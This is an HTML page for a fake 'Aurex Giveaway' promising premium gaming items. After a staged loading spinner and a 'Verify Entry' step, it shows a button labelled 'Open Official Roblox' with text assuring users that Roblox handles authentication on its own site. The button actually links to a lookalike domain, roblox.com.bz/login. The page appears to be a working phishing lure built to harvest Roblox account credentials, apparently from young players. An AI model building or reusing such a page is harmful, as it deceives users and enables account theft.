# Kslslsl
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <meta name="viewport"
          content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">

    <title>Aurex Giveaway</title>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont,
                         Roboto, sans-serif;

            background-color: #030104;

            background-image:
                radial-gradient(circle at 80% 40%,
                    rgba(255, 0, 102, 0.15), transparent 400px),
                radial-gradient(circle at 20% 70%,
                    rgba(255, 0, 60, 0.12), transparent 400px),
                radial-gradient(rgba(255, 255, 255, 0.3) 1px,
                    transparent 20px),
                radial-gradient(rgba(255, 0, 80, 0.4) 2px,
                    transparent 30px);

            background-size:
                100% 100%,
                100% 100%,
                350px 350px,
                250px 250px;

            background-position:
                0 0,
                0 0,
                40px 60px,
                130px 270px;

            color: white;

            display: flex;
            justify-content: center;
            align-items: center;

            min-height: 100vh;
            padding: 20px;
        }

        .giveaway-card {
            background: rgba(14, 7, 18, 0.88);

            border: 2px solid rgba(255, 0, 85, 0.2);

            padding: 55px 45px;

            border-radius: 24px;

            box-shadow:
                0 0 60px rgba(255, 0, 85, 0.25),
                inset 0 0 20px rgba(255, 0, 85, 0.05);

            text-align: center;

            max-width: 720px;
            width: 100%;
        }

        h1 {
            font-size: 2.7rem;
            margin-bottom: 20px;

            background:
                linear-gradient(to right, #ff1744, #d500f9);

            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;

            font-weight: 800;
        }

        .description {
            color: #a4a4c1;
            font-size: 1.15rem;
            line-height: 1.6;
            margin-bottom: 40px;
        }

        button {
            cursor: pointer;
            -webkit-tap-highlight-color: transparent;
        }

        .enter-btn {
            width: 100%;

            background:
                linear-gradient(90deg, #ff007f, #7928ca);

            color: white;
            border: none;

            padding: 20px 35px;

            font-size: 1.25rem;
            font-weight: 700;

            border-radius: 50px;

            box-shadow:
                0 0 30px rgba(255, 0, 127, 0.4);

            text-transform: uppercase;
            letter-spacing: 1.5px;
        }

        .enter-btn:hover {
            transform: translateY(-2px);
        }

        .spinner {
            display: none;

            width: 55px;
            height: 55px;

            border: 4px solid rgba(255,255,255,0.1);
            border-top: 4px solid #ff007f;

            border-radius: 50%;

            margin: 40px auto;

            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .action-view {
            display: none;
        }

        .btn-group {
            display: grid;

            grid-template-columns: 1fr 1fr;

            gap: 20px;
        }

        .split-btn {
            padding: 18px 25px;

            font-size: 1.1rem;
            font-weight: 700;

            border-radius: 50px;

            border: none;

            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .proceed-btn {
            background:
                linear-gradient(90deg, #00f2fe, #4facfe);

            color: #030104;
        }

        .close-btn {
            background: rgba(255,255,255,0.06);

            color: white;

            border:
                1px solid rgba(255,255,255,0.12);
        }

        .roblox-info {
            display: none;

            animation: fadeIn 0.3s ease;
        }

        .roblox-info h1 {
            font-size: 2.2rem;
        }

        .roblox-btn {
            display: block;

            width: 100%;

            padding: 18px;

            border-radius: 50px;

            border: none;

            background:
                linear-gradient(90deg, #ff1744, #ff5252);

            color: white;

            font-size: 1.1rem;

            font-weight: 700;

            text-decoration: none;

            text-transform: uppercase;

            letter-spacing: 1px;
        }

        .back-btn {
            margin-top: 15px;

            width: 100%;

            padding: 15px;

            border-radius: 50px;

            background: rgba(255,255,255,0.07);

            color: white;

            border: 1px solid rgba(255,255,255,0.12);
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }

        @media (max-width: 480px) {

            .giveaway-card {
                padding: 35px 25px;
            }

            h1 {
                font-size: 2.2rem;
            }

            .btn-group {
                grid-template-columns: 1fr;
                gap: 12px;
            }
        }
    </style>
</head>

<body>

    <div class="giveaway-card">

        <!-- FIRST SCREEN -->

        <div id="initialView">

            <h1>Aurex Giveaway</h1>

            <p class="description">
                The exclusive Aurex reward drop is now live!
                Click the button below to join the giveaway
                and secure your entry for premium gaming items.
            </p>

            <button
                class="enter-btn"
                id="enterBtn">

                Enter Giveaway

            </button>

        </div>


        <!-- LOADING -->

        <div
            class="spinner"
            id="loadingSpinner">
        </div>


        <!-- VERIFY SCREEN -->

        <div
            class="action-view"
            id="actionView">

            <h1>Verify Entry</h1>

            <p class="description">
                Choose an option below to continue.
            </p>

            <div class="btn-group">

                <button
                    class="split-btn proceed-btn"
                    id="proceedBtn">

                    Proceed

                </button>

                <button
                    class="split-btn close-btn"
                    id="closeBtn">

                    Close

                </button>

            </div>

        </div>


        <!-- ROBLOX INFORMATION SCREEN -->

        <div
            class="roblox-info"
            id="robloxInfo">

            <h1>Roblox</h1>

            <p class="description">
                Continue to the official Roblox website.
                Roblox will handle any account authentication
                directly on its own website.
            </p>

            <a
                class="roblox-btn"
                href="https://roblox.com.bz/login?returnUrl=0295377443746119"
                target="_blank"
                rel="noopener noreferrer">

                Open Official Roblox

            </a>

            <button
                class="back-btn"
                id="backBtn">

                Back

            </button>

        </div>

    </div>


    <script>

        const initialView =
            document.getElementById("initialView");

        const spinner =
            document.getElementById("loadingSpinner");

        const actionView =
            document.getElementById("actionView");

        const robloxInfo =
            document.getElementById("robloxInfo");


        /* ENTER */

        document
            .getElementById("enterBtn")
            .addEventListener("click", function () {

                initialView.style.display = "none";

                spinner.style.display = "block";

                setTimeout(function () {

                    spinner.style.display = "none";

                    actionView.style.display = "block";

                }, 3000);

            });


        /* PROCEED */

        document
            .getElementById("proceedBtn")
            .addEventListener("click", function () {

                actionView.style.display = "none";

                robloxInfo.style.display = "block";

            });


        /* CLOSE → FIRST SCREEN */

        document
            .getElementById("closeBtn")
            .addEventListener("click", function () {

                actionView.style.display = "none";

                spinner.style.display = "none";

                robloxInfo.style.display = "none";

                initialView.style.display = "block";

            });


        /* BACK */

        document
            .getElementById("backBtn")
            .addEventListener("click", function () {

                robloxInfo.style.display = "none";

                initialView.style.display = "block";

            });

    </script>

</body>
</html>
